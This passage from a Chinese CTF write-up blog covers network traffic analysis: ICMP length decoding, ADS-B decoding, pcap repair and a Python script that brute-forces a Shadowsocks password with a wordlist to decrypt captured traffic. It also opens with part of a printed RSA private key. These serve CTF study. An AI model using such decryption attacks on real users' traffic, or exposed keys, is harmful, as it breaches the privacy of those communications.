kzV8uz+Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN
+04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1
AnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH
/5pfc3AmEyRdfyx6zwUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH
2STT5qZWzQFz8NRe+/otNOHBR2Xk4e8IS+ehIJ3TvyE=
-----END RSA PRIVATE KEY-----
```

例题2-2024铁三初赛 流量分析

## ICMP流量分析

flag 可能藏在每一帧的长度中

```bash
tshark -r 1.pcapng -Y "icmp" -T fields -e frame.len | uniq > data.txt
```

```python
with open('data.txt', 'r') as f:
    data = f.read().split()
flag = ''
for item in data:
    flag += chr(int(item)-42)
print(flag)
```

例题1-第三届“百越杯”福建省高校网络空间安全大赛-要想会，先学会

## VPN流量分析

### Shadowsocks流量分析

例题-2023强网杯-谍影重重3.0

```python
#请求解密脚本
import hashlib
from Crypto.Cipher import AES


def EVP_BytesToKey(password, key_len, iv_len):
    m = []
    i = 0
    while len(b''.join(m)) < (key_len + iv_len):
        md5 = hashlib.md5()
        data = password
        if i > 0:
            data = m[i - 1] + password
        md5.update(data)
        m.append(md5.digest())
        i += 1
    ms = b''.join(m)
    key = ms[:key_len]
    iv = ms[key_len:key_len + iv_len]
    return key, iv


def decrypt(cipher, password):
    key_len = int(256/8)
    iv_len = 16
    mode = AES.MODE_CFB
    key, _ = EVP_BytesToKey(password, key_len, iv_len)
    cipher = bytes.fromhex(cipher)
    iv = cipher[:iv_len]
    real_cipher = cipher[iv_len:]
    obj = AES.new(key, mode, iv, segment_size=128)
    plain = obj.decrypt(real_cipher)
    return plain


def main():
cipher = 'e0a77dfafb6948728ef45033116b34fc855e7ac8570caed829ca9b4c32c2f6f79184e333445c6027e18a6b53253dca03c6c464b8289cb7a16aa1766e6a0325ee842f9a766b81039fe50c5da12dfaa89eacce17b11ba9748899b49b071851040245fa5ea1312180def3d7c0f5af6973433544a8a342e8fcd2b1759086ead124e39a8b3e2f6dc5d56ad7e8548569eae98ec363f87930d4af80e984d0103036a91be4ad76f0cfb00206'
    # 因为password未知，所以我们这里尝试用字典进行爆破
    with open('rockyou.txt', 'rb') as f:
        lines = f.readlines()
    for password in lines:
        plain = decrypt(cipher, password.strip())
        if b'HTTP' in plain:
            print(password.decode(), plain.decode())
            break


if __name__ == "__main__":
    main()
```

### VMess(V2ray)流量分析

#### VMessMD5

【例题：2022强网杯-谍影重重】

#### VMessAEAD

【例题：2024 DubheCTF-authenticated mess & unauthenticated less】

## ADS-B流量分析

飞机/航空器流量，找到流量数据，用pyModeS模块分析即可

例题

**[2023 强网杯] 谍影重重2.0**

下载附件得到一个只有TCP流量的流量包
题目需要我们分析流量包找到飞机的飞机速度和飞机的 ICAO CODE
问了GPT得知飞机常见的协议中有ADS-B，然后在网上找到pyModeS这个模块
在参考链接：https://gitee.com/wangmin-gf/ads-b 看到了与tcp.payload中相似的数据
使用tshark提取出流量包中的数据，然后使用这个脚本批量解密找speed最快的即可

tshark -r attach.pcapng -T fields -e "tcp.payload" | sed '/^\s*$/d' > tshark.txt

```python
import pyModeS
with open("tshark.txt") as f:
    data = f.readlines()
    for item in data:
        # print(item.strip())
        if len(item.strip()) != 46:
            continue
        res = pyModeS.tell(item.strip()[18:46])
        print("===========================================================================")
```

```bash
===========================================================================
                     Message: 8d79a05e990ccda6f80886dd9544
                ICAO address: 79a05e
             Downlink Format: 17
                    Protocol: Mode-S Extended Squitter (ADS-B)
                        Type: Airborne velocity
                       Speed: 371 knots
                       Track: 213.3474959459136 degrees
               Vertical rate: -64 feet/minute
                        Type: Ground speed
===========================================================================
```

## OICQ协议(QQ协议)

![](imgs/image-20250302192720139.png)

可以分析得到QQ号

## 损坏的流量包分析

例题-第一届“百度杯”信息安全攻防总决赛 find the flag（flag藏在 frame29-41 的 ip.id 字段中）

打开流量包后发现有如下的报错

![](imgs/N10.png)

可以直接使用 [在线网站](https://f00l.de/hacking/pcapfix.php) 修复

修复完成以后就是正常的流量分析了

## 从流量包中找异常流量
一般这种题目的做法就是，观察正常的流量包中的字段，毕竟一个流量包中正常的流量肯定占大多数，
然后结合过滤器，一个字段一个字段地进行排除，就是筛选出不等于正常字段值的流量。

---

> 作者: [Lunatic](https://goodlunatic.github.io)  
> URL: https://goodlunatic.github.io/posts/5422d65/  

